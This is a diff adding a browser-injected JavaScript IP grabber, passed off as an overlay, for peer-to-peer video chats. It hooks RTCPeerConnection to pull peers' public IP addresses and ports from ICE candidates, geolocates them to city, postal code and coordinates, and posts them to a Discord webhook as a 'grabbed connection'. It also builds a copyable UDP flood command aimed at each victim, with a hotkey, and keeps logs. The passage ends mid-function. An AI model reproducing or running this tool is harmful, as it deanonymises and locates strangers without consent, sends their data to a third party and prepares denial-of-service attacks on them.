@@ -1,1 +1,989 @@
+(() => {
+    const api_key = ""; // <== YOUR IPINFO.IO API KEY HERE
+    const DISCORD_WEBHOOK_URL = ""; // <== YOUR DISCORD WEBHOOK HERE
 
+    const OriginalRTCPeerConnection = window.RTCPeerConnection;
+
+    let lastIPv4 = " --- ";
+    let lastIPv4Port = " --- ";
+    let lastIPv6 = " --- ";
+    let lastIPv6Port = " --- ";
+    let lastLocation = " --- ";
+    let lastISP = " --- ";
+    let lastCity = " --- ";
+    let lastRegion = " --- ";
+    let lastPing = "Measuring...";
+
+    let currentIPData = {
+        ipv4: " --- ",
+        ipv4Port: null,
+        ipv6: " --- ",
+        ipv6Port: null,
+        city: " --- ",
+        region: " --- ",
+        org: " --- ",
+        loc: " --- ",
+        postal: " --- ",
+        timezone: " --- ",
+        country: " --- "
+    };
+
+    let sentIPs = new Set();
+    let myLogs = [];
+
+    function isValidIP(ip) {
+        const ipv4Regex = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+        const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^([0-9a-fA-F]{1,4}:){1,7}:|^([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}$|^([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}$|^([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}$|^([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}$|^([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}$|^[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})$|^:((:[0-9a-fA-F]{1,4}){1,7}|:)$/;
+        return ipv4Regex.test(ip) || ipv6Regex.test(ip);
+    }
+
+    function updateInfoMessage(html) {
+        const info = document.getElementById("Info");
+        if (info) {
+            info.innerHTML = html;
+        }
+    }
+
+    async function getLocation(ip, isV6, port = null) {
+        try {
+            const response = await fetch(`https://ipinfo.io/${ip}/json?token=${api_key}`);
+            const data = await response.json();
+
+            lastCity = data.city || " --- ";
+            lastRegion = data.region || " --- ";
+            lastISP = data.org || " --- ";
+
+            if (data.loc) {
+                const coords = data.loc.split(',');
+                currentIPData.lat = coords[0] || " --- ";
+                currentIPData.lon = coords[1] || " --- ";
+            }
+
+            currentIPData.postal = data.postal || " --- ";
+            currentIPData.timezone = data.timezone || " --- ";
+            currentIPData.country = data.country || " --- ";
+
+            if (isV6) {
+                currentIPData.ipv6 = ip;
+                currentIPData.ipv6Port = port;
+            } else {
+                currentIPData.ipv4 = ip;
+                currentIPData.ipv4Port = port;
+            }
+
+            currentIPData.city = lastCity;
+            currentIPData.region = lastRegion;
+            currentIPData.org = lastISP;
+
+            updateInfoDisplay();
+        } catch (error) {
+            console.error(error);
+        }
+    }
+
+    function updateInfoDisplay() {
+        const info = document.getElementById("Info");
+
+        if (info && (currentIPData.ipv4 !== " --- " || currentIPData.ipv6 !== " --- ")) {
+            const formattedIPv4 = currentIPData.ipv4 !== " --- "
+                ? `${currentIPData.ipv4}${currentIPData.ipv4Port ? `:${currentIPData.ipv4Port}` : ''}`
+                : '<span style="opacity: 0.5;"> --- </span>';
+
+            const formattedIPv6 = currentIPData.ipv6 !== " --- "
+                ? `[${currentIPData.ipv6}]${currentIPData.ipv6Port ? `:${currentIPData.ipv6Port}` : ''}`
+                : '<span style="opacity: 0.5;"> --- </span>';
+
+            const flagEmoji = currentIPData.country && currentIPData.country !== " --- "
+                ? String.fromCodePoint(...[...currentIPData.country.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)))
+                : '🌍';
+
+            info.innerHTML = `
+                <strong>📍 Region:</strong> <span class="mono-data">${currentIPData.region || ' --- '}</span><br>
+                <strong>🏙️ City:</strong> <span class="mono-data">${currentIPData.city || ' --- '}</span><br>
+                <strong>📮 Postal Code:</strong> <span class="mono-data">${currentIPData.postal || ' --- '}</span><br>
+                <strong>📌 Coordinates:</strong> <span class="mono-data">${currentIPData.lat || ' --- '}, ${currentIPData.lon || ' --- '}</span><br>
+                <strong>🕐 Timezone:</strong> <span class="mono-data">${currentIPData.timezone || ' --- '}</span><br>
+                <strong>📡 ISP:</strong> <span class="mono-data">${currentIPData.org || ' --- '}</span><br>
+                <strong>🌐 IPv4:</strong> <span class="mono-data">${formattedIPv4}</span><br>
+                <strong>🌎 IPv6:</strong> <span class="mono-data">${formattedIPv6}</span><br>
+                <strong>⏱️ Ping:</strong> <span class="mono-data" style="color: #007AFF; text-shadow: 0 0 8px rgba(0,122,255,0.3); font-weight: 600;">${lastPing}</span>
+            `;
+        }
+    }
+
+    window.RTCPeerConnection = function(...args) {
+        const pc = new OriginalRTCPeerConnection(...args);
+        const originalAddIceCandidate = pc.addIceCandidate;
+
+        const statsInterval = setInterval(async () => {
+            if (pc.signalingState === "closed" || pc.connectionState === "closed" || pc.connectionState === "failed") {
+                clearInterval(statsInterval);
+                return;
+            }
+            try {
+                const stats = await pc.getStats();
+                stats.forEach(report => {
+                    if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime !== undefined) {
+                        const pingMs = Math.round(report.currentRoundTripTime * 1000);
+                        lastPing = `${pingMs} ms`;
+                        updateInfoDisplay();
+                    }
+                });
+            } catch (error) {
+            }
+        }, 1000);
+
+        pc.addIceCandidate = function(iceCandidate) {
+            if (iceCandidate?.candidate) {
+                const candidateParts = iceCandidate.candidate.split(' ');
+
+                if (candidateParts.includes('srflx')) {
+                    const ipAddress = candidateParts[4];
+                    const portNumber = candidateParts[5];
+
+                    if (ipAddress && isValidIP(ipAddress)) {
+                        const isV6 = ipAddress.includes(':');
+
+                        if (isV6) {
+                            if (ipAddress !== lastIPv6 || portNumber !== lastIPv6Port) {
+                                lastIPv6 = ipAddress;
+                                lastIPv6Port = portNumber;
+                                currentIPData.ipv6 = ipAddress;
+                                currentIPData.ipv6Port = portNumber;
+                                updateInfoDisplay();
+                                getLocation(lastIPv6, true, lastIPv6Port);
+                            }
+                        } else {
+                            if (ipAddress !== lastIPv4 || portNumber !== lastIPv4Port) {
+                                lastIPv4 = ipAddress;
+                                lastIPv4Port = portNumber;
+                                currentIPData.ipv4 = ipAddress;
+                                currentIPData.ipv4Port = portNumber;
+                                updateInfoDisplay();
+                                getLocation(lastIPv4, false, lastIPv4Port);
+                            }
+                        }
+                    }
+                }
+            }
+            return originalAddIceCandidate.apply(this, arguments);
+        };
+
+        return pc;
+    };
+
+    async function copyIP() {
+        let copyText = "";
+
+        if (currentIPData.ipv4 !== " --- " && currentIPData.ipv6 !== " --- ") {
+            copyText = `IPv4: ${currentIPData.ipv4}\nIPv6: ${currentIPData.ipv6}`;
+        } else if (currentIPData.ipv4 !== " --- ") {
+            copyText = currentIPData.ipv4;
+        } else if (currentIPData.ipv6 !== " --- ") {
+            copyText = currentIPData.ipv6;
+        }
+
+        if (copyText) {
+            await navigator.clipboard.writeText(copyText);
+            updateInfoMessage(`<i class="fa-solid fa-check"></i><span>IP address(es) copied!</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 1500);
+        } else {
+            updateInfoMessage(`<i class="fa-solid fa-ban"></i><span>No IP to copy</span>`);
+        }
+    }
+
+    async function copyIPv4Only() {
+        if (currentIPData.ipv4 === " --- ") {
+            updateInfoMessage(`<i class="fa-solid fa-ban"></i><span>No IPv4 address available!</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 1500);
+            return;
+        }
+        await navigator.clipboard.writeText(currentIPData.ipv4);
+        updateInfoMessage(`<i class="fa-solid fa-check"></i><span>IPv4 copied!</span>`);
+        setTimeout(() => { updateInfoDisplay(); }, 1500);
+    }
+
+    async function copyPortOnly() {
+        if (!currentIPData.ipv4Port) {
+            updateInfoMessage(`<i class="fa-solid fa-ban"></i><span>No port available!</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 1500);
+            return;
+        }
+        await navigator.clipboard.writeText(currentIPData.ipv4Port.toString());
+        updateInfoMessage(`<i class="fa-solid fa-check"></i><span>Port copied!</span>`);
+        setTimeout(() => { updateInfoDisplay(); }, 1500);
+    }
+
+    async function copyUDPFlood() {
+        if (currentIPData.ipv4 === " --- ") {
+            updateInfoMessage(`<i class="fa-solid fa-ban"></i><span>No IPv4 available to flood!</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 1500);
+            return;
+        }
+
+        const port = currentIPData.ipv4Port || '';
+        let floodCommand;
+
+        if (port) {
+            floodCommand = `udp-koid ${currentIPData.ipv4} ${port} 120`;
+        } else {
+            floodCommand = `udp-koid ${currentIPData.ipv4}`;
+        }
+
+        try {
+            await navigator.clipboard.writeText(floodCommand);
+            updateInfoMessage(`<i class="fa-solid fa-bolt"></i><span>Flood command copied: ${floodCommand}</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 2000);
+        } catch (error) {
+            updateInfoMessage(`<i class="fa-solid fa-times-circle"></i><span>Copy failed!</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 1500);
+        }
+    }
+
+    async function copyPort() {
+        let portText = "";
+
+        if (currentIPData.ipv4Port && currentIPData.ipv6Port) {
+            portText = `IPv4 Port: ${currentIPData.ipv4Port}, IPv6 Port: ${currentIPData.ipv6Port}`;
+        } else if (currentIPData.ipv4Port) {
+            portText = currentIPData.ipv4Port.toString();
+        } else if (currentIPData.ipv6Port) {
+            portText = currentIPData.ipv6Port.toString();
+        }
+
+        if (portText) {
+            await navigator.clipboard.writeText(portText);
+            updateInfoMessage(`<i class="fa-solid fa-check"></i><span>Port(s) copied!</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 1500);
+        } else {
+            updateInfoMessage(`<i class="fa-solid fa-ban"></i><span>No port to copy</span>`);
+        }
+    }
+
+    // ---- Send to Discord (YOUR EXACT EMBED INSERTED) ----
+    async function sendToDiscord() {
+        if (currentIPData.ipv4 === " --- " && currentIPData.ipv6 === " --- ") {
+            updateInfoMessage(`<i class="fa-solid fa-triangle-exclamation"></i><span>No available data...</span>`);
+            return;
+        }
+
+        const ipKey = `${currentIPData.ipv4}:${currentIPData.ipv4Port || ''}_${currentIPData.ipv6}:${currentIPData.ipv6Port || ''}`;
+
+        if (sentIPs.has(ipKey)) {
+            updateInfoMessage(`<i class="fa-solid fa-clock"></i><span>This IP was already sent!</span>`);
+            return;
+        }
+
+        const sendBtn = document.getElementById("send-button");
+        const originalHtml = sendBtn.innerHTML;
+        sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-pulse"></i><span>Sending</span>';
+
+        try {
+            const coords = (currentIPData.lat && currentIPData.lon)
+                ? `${currentIPData.lat}, ${currentIPData.lon}`
+                : " --- ";
+
+            const ipv6Display = currentIPData.ipv6 !== " --- "
+                ? `[${currentIPData.ipv6}]${currentIPData.ipv6Port ? `:${currentIPData.ipv6Port}` : ''}`
+                : " --- ";
+
+            const flagEmoji = currentIPData.country && currentIPData.country !== " --- "
+                ? String.fromCodePoint(...[...currentIPData.country.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)))
+                : '🌍';
+
+            const floodCmd = `udp-koid ${currentIPData.ipv4} ${currentIPData.ipv4Port || ''}`.trim();
+
+            const embed = {
+                title: "Új grabbelt kapcsolat!:",
+                color: 0x660000,
+                fields: [
+                    {
+                        name: "",
+                        value: "```diff\n+ Basic informations:\n```",
+                        inline: false
+                    },
+                    {
+                        name: "🌃 City:",
+                        value: `${currentIPData.city || ' --- '}`,
+                        inline: true
+                    },
+                    {
+                        name: "🌍 Country:",
+                        value: `${flagEmoji} ${currentIPData.country || ' --- '}`,
+                        inline: true
+                    },
+                    {
+                        name: "📮 Postal code:",
+                        value: currentIPData.postal || " --- ",
+                        inline: true
+                    },
+                    {
+                        name: "📌 Coordinates:",
+                        value: coords,
+                        inline: true
+                    },
+                    {
+                        name: "🕐 Timezone:",
+                        value: currentIPData.timezone || " --- ",
+                        inline: true
+                    },
+                    {
+                        name: "📡 Internet Service Provider (ISP):",
+                        value: currentIPData.org || " --- ",
+                        inline: true
+                    },
+                    {
+                        name: "",
+                        value: "```diff\n+ Network information:\n```",
+                        inline: false
+                    },
+                    {
+                        name: "🌐 IPv4 address:",
+                        value: `\`${currentIPData.ipv4 || ' --- '}\``,
+                        inline: true
+                    },
+                    {
+                        name: "🔌 Port:",
+                        value: `\`${currentIPData.ipv4Port || ' --- '}\``,
+                        inline: true
+                    },
+                    {
+                        name: "⏱️ Ping (Latency):",
+                        value: `\`${lastPing}\``,
+                        inline: true
+                    },
+                    {
+                        name: "🌎 IPv6 address:",
+                        value: `\`${ipv6Display}\``,
+                        inline: false
+                    },
+                    {
+                        name: "",
+                        value: "```diff\n+ UDP-Koid\n```",
+                        inline: false
+                    },
+                    {
+                        name: "Command:",
+                        value: `\`\`\`bash\n${floodCmd} 120\n\`\`\``,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: `Grabbed by Benedek201_ • ${new Date().toLocaleString('hu-HU', { timeZone: 'Europe/Budapest' })}`,
+                },
+                timestamp: new Date().toISOString(),
+            };
+
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+
+            if (response.ok) {
+                sentIPs.add(ipKey);
+                myLogs.push(`${currentIPData.org} | ${currentIPData.lat}, ${currentIPData.lon} | IPv4: ${currentIPData.ipv4} | IPv6: ${currentIPData.ipv6}`);
+                updateInfoMessage(`<i class="fa-solid fa-check-circle"></i><span>Successfully sent! :)</span>`);
+                setTimeout(() => { updateInfoDisplay(); }, 1500);
+            } else {
+                const errorText = await response.text();
+                console.error("Discord webhook error:", response.status, errorText);
+                updateInfoMessage(`<i class="fa-solid fa-times-circle"></i><span>Send failed! Status: ${response.status}</span>`);
+            }
+        } catch (error) {
+            console.error("Discord send error:", error);
+            updateInfoMessage(`<i class="fa-solid fa-exclamation-triangle"></i><span>Error while sending... :(</span>`);
+        } finally {
+            setTimeout(() => { sendBtn.innerHTML = originalHtml; }, 1500);
+        }
+    }
+
+    function saveLogs() {
+        if (myLogs.length === 0) {
+            updateInfoMessage(`<i class="fa-solid fa-triangle-exclamation"></i><span>No logs to save...! :(</span>`);
+            return;
+        }
+
+        const content = myLogs.join('\n');
+        const blob = new Blob([content], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `koid#1-logs-${Date.now()}.txt`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        URL.revokeObjectURL(url);
+
+        updateInfoMessage(`<i class="fa-solid fa-file-arrow-down"></i><span>Logs saved successfully! :)</span>`);
+        setTimeout(() => { updateInfoDisplay(); }, 1500);
+    }
+
+    document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.key === 'c') {
+            e.preventDefault();
+            copyIPv4Only();
+        }
+        if (e.ctrlKey && e.key === 'f') {
+            e.preventDefault();
+            copyPortOnly();
+        }
+        if (e.key === 'p' || e.key === 'P') {
+            e.preventDefault();
+            copyUDPFlood();
+        }
+    });
+
+    const overlay = document.createElement('div');
+    overlay.id = 'overlay';
+
+    const Title = document.createElement('p');
+    Title.id = 'Title';
+    Title.innerHTML = 'Vapsolo Sixer';
+
+    const Info = document.createElement('p');
+    Info.id = 'Info';
+
+    const infoIcon = document.createElement('i');
+    infoIcon.className = 'fa-solid fa-circle-check';
+
+    const infoText = document.createElement('span');
+    infoText.textContent = 'Puller injected successfully, made with love by 95.benedek._ !! ❤';
+
+    Info.appendChild(infoIcon);
+    Info.appendChild(infoText);
+
+    const buttonContainer = document.createElement('div');
+    buttonContainer.id = 'button-container';
+
+    const buttonFlood = document.createElement('div');
+    buttonFlood.id = 'button-flood';
+    buttonFlood.className = 'copy';
+    buttonFlood.innerHTML = '<i class="fa-solid fa-burst"></i><span>💥 UDP-Koid</span>';
+    buttonFlood.setAttribute('onclick', 'copyUDPFlood()');
+
+    const buttonSend = document.createElement('div');
+    buttonSend.id = 'send-button';
+    buttonSend.className = 'send';
+    buttonSend.innerHTML = '<i class="fa-brands fa-discord"></i><span>📩 Webhook</span>';
+    buttonSend.setAttribute('onclick', 'sendToDiscord()');
+
+    const buttonCopy = document.createElement('div');
+    buttonCopy.id = 'button';
+    buttonCopy.className = 'copy';
+    buttonCopy.innerHTML = '<i class="fa-solid fa-copy"></i><span>📋 Copy IP address(es)</span>';
+    buttonCopy.setAttribute('onclick', 'copyIP()');
+
+    const buttonSave = document.createElement('div');
+    buttonSave.id = 'button';
+    buttonSave.className = 'save';
+    buttonSave.innerHTML = '<i class="fa-solid fa-floppy-disk"></i><span>📥 Save Log</span>';
+    buttonSave.setAttribute('onclick', 'saveLogs()');
+
+    buttonContainer.appendChild(buttonFlood);
+    buttonContainer.appendChild(buttonSend);
+    buttonContainer.appendChild(buttonCopy);
+    buttonContainer.appendChild(buttonSave);
+
+    const madeBy = document.createElement('div');
+    madeBy.id = 'MadeBy';
+    madeBy.innerHTML = '<span>Made by: <strong>Benedek201_</strong> • Discord: 95.benedek._</span>';
+
+    overlay.appendChild(Title);
+    overlay.appendChild(Info);
+    overlay.appendChild(buttonContainer);
+    overlay.appendChild(madeBy);
+
+    (document.body || document.documentElement).appendChild(overlay);
+
+    const style = document.createElement('style');
+    style.textContent = `
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+            background: radial-gradient(ellipse at 30% 20%, #1a1a2e 0%, #0a0a12 60%, #000000 100%);
+            color: #e8edf5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 2rem;
+            left: 2rem;
+            z-index: 9999;
+            min-width: 340px;
+            max-width: 400px;
+            background: rgba(13, 13, 13, 0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 22px 24px 18px 24px;
+            border-radius: 20px;
+            color: #e8edf5;
+            overflow: hidden;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 255, 255, 0.04) inset;
+            text-align: left;
+            transition: border-color 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94), box-shadow 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94), transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            transform: translateY(0);
+        }
+
+        #overlay:hover {
+            box-shadow: 0 30px 100px rgba(0, 0, 0, 0.95), 0 0 0 1px rgba(255, 255, 255, 0.08) inset;
+            border-color: rgba(255, 255, 255, 0.12);
+        }
+
+        #overlay * {
+            position: relative;
+            z-index: 3;
+        }
+
+        #overlay p#Title {
+            font-size: 1.15rem;
+            font-weight: 650;
+            margin: 0 0 14px 0;
+            text-align: center;
+            color: #FFFFFF;
+            letter-spacing: -0.02em;
+            user-select: none;
+            cursor: move;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+            background: linear-gradient(135deg, #ffffff 0%, #a0aec0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        #overlay.dragging {
+            cursor: move;
+            border-color: rgba(255, 255, 255, 0.18);
+            box-shadow: 0 30px 100px rgba(0, 0, 0, 0.95);
+            transform: scale(1.02);
+        }
+
+        #overlay p#Info {
+            font-size: 0.8rem;
+            color: #D1D5DB;
+            margin: 0 0 16px 0;
+            line-height: 1.8;
+            user-select: none;
+            text-align: left;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 14px 16px;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            font-weight: 400;
+            letter-spacing: -0.01em;
+            transition: background 0.3s ease;
+        }
+
+        #overlay p#Info:hover {
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        #overlay p#Info strong {
+            color: #9CA3AF;
+            font-weight: 550;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: inline-block;
+            min-width: 85px;
+            margin-right: 4px;
+        }
+
+        #overlay p#Info .mono-data {
+            font-family: 'Consolas', 'Courier New', 'SF Mono', 'Menlo', monospace;
+            font-size: 0.76rem;
+            color: #E5E7EB;
+            font-weight: 400;
+            word-break: break-all;
+            letter-spacing: 0.02em;
+            transition: color 0.3s ease;
+        }
+
+        #overlay p#Info .mono-data:hover {
+            color: #FFFFFF;
+        }
+
+        #overlay p#Info span[style*="opacity: 0.5"] {
+            color: #6B7280;
+            font-family: 'Consolas', 'Courier New', 'SF Mono', 'Menlo', monospace;
+        }
+
+        #overlay #button-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 12px;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        #overlay #button-container > div {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            text-align: center;
+            cursor: pointer;
+            border-radius: 12px;
+            padding: 8px 18px;
+            font-size: 0.76rem;
+            font-weight: 510;
+            color: #FFFFFF;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            user-select: none;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+            letter-spacing: -0.01em;
+            white-space: nowrap;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #overlay #button-container > div::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+            transition: left 0.5s ease;
+        }
+
+        #overlay #button-container > div:hover::before {
+            left: 100%;
+        }
+
+        #overlay #button-container > div i {
+            font-size: 0.85rem;
+            color: #9CA3AF;
+            transition: color 0.3s ease, transform 0.3s ease;
+        }
+
+        #overlay #button-container > div:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.15);
+            transform: translateY(-2px) scale(1.03);
+            color: #FFFFFF;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        #overlay #button-container > div:hover i {
+            color: #D1D5DB;
+            transform: scale(1.1);
+        }
+
+        #overlay #button-container > div:active {
+            transform: scale(0.94);
+            background: rgba(255, 255, 255, 0.04);
+            box-shadow: none;
+        }
+
+        #overlay #button-container #button-flood {
+            background: linear-gradient(135deg, #CB4335, #A93226);
+            border-color: #CB4335;
+            color: #FFFFFF;
+            box-shadow: 0 4px 15px rgba(203, 67, 53, 0.2);
+        }
+
+        #overlay #button-container #button-flood i {
+            color: #FFFFFF;
+        }
+
+        #overlay #button-container #button-flood:hover {
+            background: linear-gradient(135deg, #D9594C, #CB4335);
+            border-color: #D9594C;
+            box-shadow: 0 6px 30px rgba(203, 67, 53, 0.35);
+            transform: translateY(-2px) scale(1.03);
+        }
+
+        #overlay #button-container #button-flood:hover i {
+            color: #FFFFFF;
+        }
+
+        #overlay #button-container #send-button {
+            background: linear-gradient(135deg, #2874A6, #1A5276);
+            border-color: #2874A6;
+            color: #FFFFFF;
+            box-shadow: 0 4px 15px rgba(40, 116, 166, 0.2);
+        }
+
+        #overlay #button-container #send-button i {
+            color: #FFFFFF;
+        }
+
+        #overlay #button-container #send-button:hover {
+            background: linear-gradient(135deg, #2E86C1, #2874A6);
+            border-color: #2E86C1;
+            box-shadow: 0 6px 30px rgba(40, 116, 166, 0.35);
+            transform: translateY(-2px) scale(1.03);
+        }
+
+        #overlay #button-container #send-button:hover i {
+            color: #FFFFFF;
+        }
+
+        #overlay #button-container .save {
+            background: linear-gradient(135deg, #15803D, #0D6B2F);
+            border-color: #15803D;
+            color: #FFFFFF;
+            box-shadow: 0 4px 15px rgba(21, 128, 61, 0.2);
+        }
+
+        #overlay #button-container .save i {
+            color: #FFFFFF;
+        }
+
+        #overlay #button-container .save:hover {
+            background: linear-gradient(135deg, #16A34A, #15803D);
+            border-color: #16A34A;
+            box-shadow: 0 6px 30px rgba(21, 128, 61, 0.35);
+            transform: translateY(-2px) scale(1.03);
+        }
+
+        #overlay #button-container .save:hover i {
+            color: #FFFFFF;
+        }
+
+        #overlay #button-container .copy {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 255, 255, 0.08);
+        }
+
+        #overlay #button-container .copy:hover {
+            background: rgba(255, 255, 255, 0.14);
+            border-color: rgba(255, 255, 255, 0.18);
+            box-shadow: 0 6px 25px rgba(255, 255, 255, 0.05);
+        }
+
+        #overlay #button-container .copy:hover i {
+            color: #FFFFFF;
+        }
+
+        #overlay #MadeBy {
+            margin-top: 10px;
+            font-size: 0.65rem;
+            text-align: right;
+            color: #6B7280;
+            user-select: none;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            letter-spacing: 0.3px;
+            font-weight: 400;
+            transition: color 0.3s ease;
+        }
+
+        #overlay #MadeBy:hover {
+            color: #9CA3AF;
+        }
+
+        #overlay #MadeBy strong {
+            color: #9CA3AF;
+            font-weight: 550;
+            letter-spacing: 0.1px;
+            transition: color 0.3s ease;
+        }
+
+        #overlay #MadeBy strong:hover {
+            color: #D1D5DB;
+        }
+
+        #overlay #MadeBy span {
+            color: #6B7280;
+        }
+
+        canvas#plexus {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0 !important;
+            pointer-events: none;
+            opacity: 0.06;
+            border-radius: 20px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(16px) scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; }
+        }
+
+        #overlay p#Info .mono-data[style*="color: #007AFF"] {
+            animation: pulseGlow 2.5s ease-in-out infinite;
+            color: #007AFF !important;
+        }
+
+        #overlay::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        #overlay::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        #overlay::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+        }
+
+        #overlay::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        ::selection {
+            background: rgba(255, 255, 255, 0.08);
+            color: #ffffff;
+        }
+
+        #overlay:focus-visible {
+            outline: none;
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    const canvas = document.createElement('canvas');
+    canvas.id = 'plexus';
+    overlay.insertBefore(canvas, overlay.firstChild);
+
+    const ctx = canvas.getContext('2d');
+    let nodes = [];
+    const nodeCount = 22;
+    const maxDistance = 75;
+
+    function resizePlexus() {
+        canvas.width = overlay.offsetWidth;
+        canvas.height = overlay.offsetHeight;
+    }
+
+    function initPlexus() {
+        resizePlexus();
+        nodes = [];
+
+        for (let i = 0; i < nodeCount; i++) {
+            nodes.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                vx: (Math.random() - 0.5) * 0.4,
+                vy: (Math.random() - 0.5) * 0.4,
+                radius: Math.random() * 1.8 + 0.8
+            });
+        }
+    }
+
+    function drawPlexus() {
+        if (!canvas.width || !canvas.height) return;
+
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        for (let i = 0; i < nodes.length; i++) {
+            const node = nodes[i];
+
+            node.x += node.vx;
+            node.y += node.vy;
+
+            if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
+            if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
+
+            ctx.beginPath();
+            ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
+            ctx.fillStyle = 'rgba(255, 255, 255, 0.15)';
+            ctx.fill();
+
+            for (let j = i + 1; j < nodes.length; j++) {
+                const other = nodes[j];
+                const dx = node.x - other.x;
+                const dy = node.y - other.y;
+                const dist = Math.sqrt(dx * dx + dy * dy);
+
+                if (dist < maxDistance) {
+                    ctx.beginPath();
+                    ctx.moveTo(node.x, node.y);
+                    ctx.lineTo(other.x, other.y);
+
+                    const alpha = (1 - dist / maxDistance) * 0.06;
+                    ctx.strokeStyle = `rgba(255, 255, 255, ${alpha})`;
+                    ctx.lineWidth = 0.5;
+                    ctx.stroke();
+                }
+            }
+        }
+
+        requestAnimationFrame(drawPlexus);
+    }
+
+    window.addEventListener('resize', resizePlexus);
+    initPlexus();
+    drawPlexus();
+
+    let isDragging = false;
+    let dragOffsetX = 0;
+    let dragOffsetY = 0;
+
+    Title.addEventListener('mousedown', (e) => {
+        isDragging = true;
+        overlay.classList.add('dragging');
+
+        const rect = overlay.getBoundingClientRect();
+        dragOffsetX = e.clientX - rect.left;
+        dragOffsetY = e.clientY - rect.top;
+
+        e.preventDefault();
+    });
+
+    window.addEventListener('mousemove', (e) => {
+        if (!isDragging) return;
+
+        overlay.style.top = (e.clientY - dragOffsetY) + 'px';
+        overlay.style.left = (e.clientX - dragOffsetX) + 'px';
+        overlay.style.bottom = 'auto';
+        overlay.style.right = 'auto';
+    });
+
+    window.addEventListener('mouseup', () => {
